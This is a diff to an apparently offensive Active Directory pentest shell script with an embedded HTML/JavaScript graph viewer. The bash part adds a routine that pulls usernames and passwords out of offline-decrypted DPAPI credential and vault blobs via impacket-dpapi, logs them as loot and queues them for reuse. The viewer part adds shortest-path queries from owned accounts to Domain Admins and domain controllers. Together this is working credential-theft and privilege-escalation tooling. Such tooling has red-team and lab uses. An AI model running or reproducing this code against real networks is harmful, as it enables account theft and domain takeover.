@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.5.0"
+readonly VERSION="1.6.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1726,22 +1726,47 @@ phase_dpapi_offline() {
 
     [[ ${#MKEYS[@]} -eq 0 ]] && { info "No DPAPI masterkey could be decrypted with the known passwords"; return; }
 
-    subsection "Decrypting credential/vault blobs"
+    # Pull a (user,password) out of any decrypted DPAPI output and pivot on it
+    _dpapi_ingest() {
+        local o="$1" src="$2" u p
+        u=$(printf '%s' "$o" | grep -oiP 'Username\s*:\s*\K.+'        | head -1 | sed 's#.*\\##' | tr -d '\r ')
+        p=$(printf '%s' "$o" | grep -oiP 'Password\s*:\s*\K\S.*'      | head -1 | tr -d '\r')
+        [[ -z "$p" ]] && p=$(printf '%s' "$o" | grep -oiP 'Unknown\s*:\s*\K\S.*' | tail -1 | tr -d '\r')
+        [[ -n "$p" ]] && _plausible_secret "$p" || return 1
+        loot "★★ DPAPI secret recovered → ${C_GREEN}${u:-?} : ${p}${C_RESET}"
+        add_secret "$p" "DPAPI offline ($src)"
+        [[ -n "$u" ]] && { note_cred_source "${u}:${p}" "DPAPI offline decrypt"; queue_cred "$u" "$p" ""; }
+        return 0
+    }
+
+    subsection "Decrypting credential blobs"
+    local blob
     while IFS= read -r blob; do
         [[ -z "$blob" ]] && continue
         for k in "${MKEYS[@]}"; do
             out=$(impacket-dpapi credential -file "$blob" -key "0x$k" 2>/dev/null)
             printf '%s' "$out" | grep -qiE 'Username|Target' || continue
-            local cu cp; cu=$(printf '%s' "$out" | grep -oiP 'Username\s*:\s*\K.+' | head -1 | sed 's#.*\\##' | tr -d '\r')
-            cp=$(printf '%s' "$out" | grep -oiP '(Unknown|Password)\s*:\s*\K\S.*' | tail -1 | tr -d '\r')
-            if [[ -n "$cp" ]] && _plausible_secret "$cp"; then
-                loot "★★ DPAPI credential recovered → ${C_GREEN}${cu:-?} : ${cp}${C_RESET}"
-                add_secret "$cp" "DPAPI offline ($(basename "$blob"))"
-                [[ -n "$cu" ]] && { note_cred_source "${cu}:${cp}" "DPAPI offline decrypt"; queue_cred "$cu" "$cp" ""; }
-                break
-            fi
+            _dpapi_ingest "$out" "$(basename "$blob")" && break
         done
-    done <<<"$creds"
+    done < <(find "$dl" -type f -ipath '*credentials*' ! -iname '*.pol' 2>/dev/null)
+
+    subsection "Decrypting vault credentials (vpol + vcrd)"
+    local vpol vdir vkeys vcrd
+    while IFS= read -r vpol; do
+        [[ -z "$vpol" ]] && continue
+        vdir=$(dirname "$vpol")
+        for k in "${MKEYS[@]}"; do
+            vkeys=$(impacket-dpapi vault -vpol "$vpol" -key "0x$k" 2>/dev/null | grep -oiP '0x[0-9a-f]{16,}' | head -2 | tr '\n' ' ')
+            [[ -z "$vkeys" ]] && continue
+            while IFS= read -r vcrd; do
+                [[ -z "$vcrd" ]] && continue
+                # shellcheck disable=SC2086
+                out=$(impacket-dpapi vault -vcrd "$vcrd" -vpolkeys $vkeys 2>/dev/null)
+                _dpapi_ingest "$out" "$(basename "$vcrd")"
+            done < <(find "$vdir" -type f -iname '*.vcrd' 2>/dev/null)
+            break
+        done
+    done < <(find "$dl" -type f -iname '*.vpol' 2>/dev/null)
 }
 
 # ===========================================================================
@@ -1999,7 +2024,9 @@ HTML_TEMPLATE = r'''<!doctype html>
   #results .r:hover,#results .r.sel{background:rgba(125,255,196,.10)}
   #results .r .d{width:9px;height:9px;border-radius:50%;flex:0 0 auto;box-shadow:0 0 8px currentColor}
   #results .r small{color:var(--muted);margin-left:auto}
-  #dock{position:fixed;top:74px;left:20px;z-index:5;display:flex;flex-direction:column;gap:8px}
+  #dock{position:fixed;top:74px;left:20px;z-index:5;display:flex;flex-direction:column;gap:6px;max-width:210px}
+  #dock .qlabel{font-size:9.5px;letter-spacing:1.6px;color:#5b6677;margin:8px 2px 1px;font-weight:700}
+  .tab.active{border-color:rgba(255,210,74,.7);color:#ffd24a;background:rgba(255,210,74,.08)}
   .tab{cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;color:var(--ink);text-align:left;
     background:var(--glass);backdrop-filter:blur(14px);border:1px solid var(--line);border-radius:11px;padding:9px 13px;
     box-shadow:0 8px 26px rgba(0,0,0,.4);transition:.15s}
@@ -2085,7 +2112,14 @@ HTML_TEMPLATE = r'''<!doctype html>
 <div id="results"></div>
 
 <div id="dock">
-  <button id="btnFind" class="tab" title="Who can abuse what">&#9876; Attack paths</button>
+  <div class="qlabel">VIEW</div>
+  <button class="tab q" data-q="owned" title="What you control">&#9760; Owned</button>
+  <button class="tab q" data-q="da"    title="Shortest paths from owned to Domain Admins">&#128081; &rarr; Domain Admins</button>
+  <button class="tab q" data-q="dc"    title="Shortest paths from owned to a Domain Controller">&#128421;&#65039; &rarr; DC</button>
+  <button class="tab q" data-q="hv"    title="High-value targets">&#11088; High value</button>
+  <button class="tab q" data-q="all"   title="Everything (can be busy)">&#128301; Everything</button>
+  <div class="qlabel">LIST</div>
+  <button id="btnFind" class="tab" title="Who can abuse what">&#9876; Abusable ACLs</button>
   <button id="btnUsers" class="tab" title="All users">&#128100; Users</button>
 </div>
 <div id="findings" class="glass">
@@ -2135,24 +2169,63 @@ N.forEach((n,i)=>{n._i=i; n.r=(n.type==="Domain"?14:n.hv?10:7)+Math.min(deg[i]*0
   const a=Math.random()*6.28, rad=120+Math.random()*240;
   n.x=Math.cos(a)*rad; n.y=Math.sin(a)*rad; n.vx=0; n.vy=0;});
 
-// ---- VISIBLE SET: start focused (owned + high-value + attack paths) --------
-// Showing every node is noise; we render only what matters and let the user
-// expand (click) or search to pull in the rest on demand.
-const vis=new Set();
-// Focus = what you own + the nodes that actually sit on an attack path to a
-// high-value target. Standalone high-value groups with no inbound path are
-// noise, so they're left out of the default view (search/expand to reach them).
-function defaultFocus(){ vis.clear();
-  N.forEach((n,i)=>{ if(n.owned||n.p) vis.add(i); });
-  if(vis.size<2){ N.forEach((n,i)=>{ if(n.hv) vis.add(i); }); }      // no paths → show targets
-  if(vis.size<2){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,20).forEach(i=>vis.add(i)); }
+// Directed adjacency (s → t) for shortest-path queries, like BloodHound.
+const outAdj=N.map(()=>[]), inAdj=N.map(()=>[]);
+E.forEach((e,i)=>{ outAdj[e.s].push([e.t,i]); inAdj[e.t].push([e.s,i]); });
+const ownedIdx=[...N.keys()].filter(i=>N[i].owned);
+const hvIdx=[...N.keys()].filter(i=>N[i].hv);
+const _U=s=>(s||"").toUpperCase();
+const _dcShort=_U(DCHOST).split(".")[0];
+const daSet=new Set([...N.keys()].filter(i=>N[i].type!=="User" &&
+  ["DOMAIN ADMINS","ENTERPRISE ADMINS","ADMINISTRATORS","SCHEMA ADMINS"].some(w=>_U(N[i].label).includes(w))));
+const dcSet=new Set([...N.keys()].filter(i=>
+  _U(N[i].label).includes("DOMAIN CONTROLLERS") ||
+  (N[i].type==="Computer" && (N[i].hv || (_dcShort && _U(N[i].label).startsWith(_dcShort))))));
+const PATHSET=new Set();   // edge indices on the currently-displayed attack path
+
+// shortest paths from owned nodes to a target set (union); fall back to the
+// targets + their direct attackers when nothing is owned yet.
+function pathsTo(targets){
+  const nodes=new Set(), edges=new Set();
+  if(!ownedIdx.length){ targets.forEach(t=>{ nodes.add(t);
+    inAdj[t].forEach(([s,ei])=>{ nodes.add(s); edges.add(ei); }); }); return {nodes,edges}; }
+  ownedIdx.forEach(start=>{
+    const prev=new Map([[start,-1]]), pe=new Map(); const q=[start]; let hit=-1;
+    for(let h=0; h<q.length && hit<0; h++){ const u=q[h];
+      if(targets.has(u) && u!==start){ hit=u; break; }
+      for(const [v,ei] of outAdj[u]) if(!prev.has(v)){ prev.set(v,u); pe.set(v,ei); q.push(v); } }
+    if(hit>=0){ let nd=hit; nodes.add(nd);
+      while(prev.get(nd)!==-1){ edges.add(pe.get(nd)); nd=prev.get(nd); nodes.add(nd); } }
+  });
+  ownedIdx.forEach(i=>nodes.add(i));
+  return {nodes,edges};
 }
-defaultFocus();
-let visArr=[...vis], VE=[];
+
+// ---- VISIBLE SET: BloodHound-style. Start tiny (just what you own) and let
+// the operator pick a VIEW (→ Domain Admins, → DC, High value) or search/expand.
+const vis=new Set();
+let visArr=[], VE=[], curView="owned";
 function refresh(){ visArr=[...vis]; const s=new Set();
   visArr.forEach(i=>incE[i].forEach(ei=>{const e=E[ei]; if(vis.has(e.s)&&vis.has(e.t))s.add(ei);}));
   VE=[...s]; updateCount(); }
 function expand(i){ vis.add(i); nb[i].forEach(j=>vis.add(j)); refresh(); reheat(); }
+
+// Switch the displayed query/view. Reseeds positions for a clean layout.
+function applyView(q){
+  curView=q; vis.clear(); PATHSET.clear();
+  if(q==="owned"){ (ownedIdx.length?ownedIdx:hvIdx).forEach(i=>{ vis.add(i); nb[i].forEach(j=>vis.add(j)); }); }
+  else if(q==="hv"){ hvIdx.forEach(i=>vis.add(i)); }
+  else if(q==="all"){ N.forEach((_,i)=>vis.add(i)); }
+  else { const tgt=(q==="dc")?dcSet:daSet; const r=pathsTo(tgt);
+         r.nodes.forEach(i=>vis.add(i)); r.edges.forEach(e=>PATHSET.add(e)); tgt.forEach(t=>vis.add(t)); }
+  if(vis.size<1){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,15).forEach(i=>vis.add(i)); }
+  [...vis].forEach(i=>{const a=Math.random()*6.28,rad=120+Math.random()*260;
+    N[i].x=Math.cos(a)*rad; N[i].y=Math.sin(a)*rad; N[i].vx=N[i].vy=0; N[i].fx=N[i].fy=null;});
+  refresh(); if(typeof select==="function") select(-1);
+  document.querySelectorAll('#dock .q').forEach(b=>b.classList.toggle('active', b.dataset.q===q));
+  if(typeof warmup==="function") warmup();
+}
+applyView("owned");   // initial (no warmup yet — boot does it)
 
 const cv=document.getElementById("c"), ctx=cv.getContext("2d");
 let W=0,Hh=0,DPR=Math.min(window.devicePixelRatio||1,2);
@@ -2208,8 +2281,9 @@ function draw(){
     const e=E[ei], a=N[e.s], b=N[e.t];
     const [ax,ay]=toScreen(a.x,a.y),[bx,by]=toScreen(b.x,b.y);
     const rel = active>=0 && (e.s===active||e.t===active);
+    const onp = PATHSET.size ? PATHSET.has(ei) : e.p;   // view path, else python path
     let col, w, glow=0;
-    if(e.p){col="rgba(255,45,109,.92)";w=2.1;glow=10;}
+    if(onp){col="rgba(255,45,109,.92)";w=2.1;glow=10;}
     else if(rel){col="rgba(159,203,255,.85)";w=1.7;glow=5;}
     else if(active>=0){col="rgba(120,130,150,.06)";w=1;}
     else {col="rgba(130,142,165,.22)";w=1;}
@@ -2217,9 +2291,9 @@ function draw(){
     const cx=mx-dy*0.12, cy=my+dx*0.12;
     ctx.beginPath(); ctx.moveTo(ax,ay); ctx.quadraticCurveTo(cx,cy,bx,by);
     ctx.strokeStyle=col; ctx.lineWidth=w;
-    ctx.shadowBlur=glow; ctx.shadowColor=e.p?"#ff2d6d":"#9fcbff";
+    ctx.shadowBlur=glow; ctx.shadowColor=onp?"#ff2d6d":"#9fcbff";
     ctx.stroke(); ctx.shadowBlur=0;
-    if(e.p||rel){const ang=Math.atan2(by-cy,bx-cx), r=N[e.t].r+3;
+    if(onp||rel){const ang=Math.atan2(by-cy,bx-cx), r=N[e.t].r+3;
       const ex=bx-Math.cos(ang)*r, ey=by-Math.sin(ang)*r, s=6;
       ctx.beginPath(); ctx.moveTo(ex,ey);
       ctx.lineTo(ex-Math.cos(ang-0.4)*s,ey-Math.sin(ang-0.4)*s);
@@ -2419,15 +2493,16 @@ document.getElementById("ffilter").addEventListener("input",e=>{(fmode==="find"?
 // ---- warm up the layout synchronously, then fit (deterministic first paint)
 function warmup(iters){ alpha=1; for(let k=0;k<(iters||420);k++) step(); fit(); fitted=true; requestDraw(); }
 
-// ---- reset to the focused starting view ----
+// ---- VIEW buttons (Owned · → Domain Admins · → DC · High value · Everything)
+document.querySelectorAll('#dock .q').forEach(b=>b.addEventListener("click",()=>applyView(b.dataset.q)));
+
+// ---- reset = back to the Owned view ----
 const rb=document.getElementById("reset");
-if(rb) rb.addEventListener("click",()=>{ defaultFocus();
-  N.forEach(n=>{const a=Math.random()*6.28,rad=160+Math.random()*300;n.x=Math.cos(a)*rad;n.y=Math.sin(a)*rad;n.vx=n.vy=0;n.fx=n.fy=null;});
-  refresh(); select(-1); q.value=""; matches=[]; renderResults(); warmup();});
+if(rb) rb.addEventListener("click",()=>{ q.value=""; matches=[]; renderResults(); applyView("owned"); });
 addEventListener("keydown",ev=>{if(ev.key==="Escape"){select(-1);closeFindings();}});
 
 // ---- boot ----
-resize(); refresh(); warmup();
+resize(); applyView("owned"); warmup();
 </script>
 </body>
 </html>
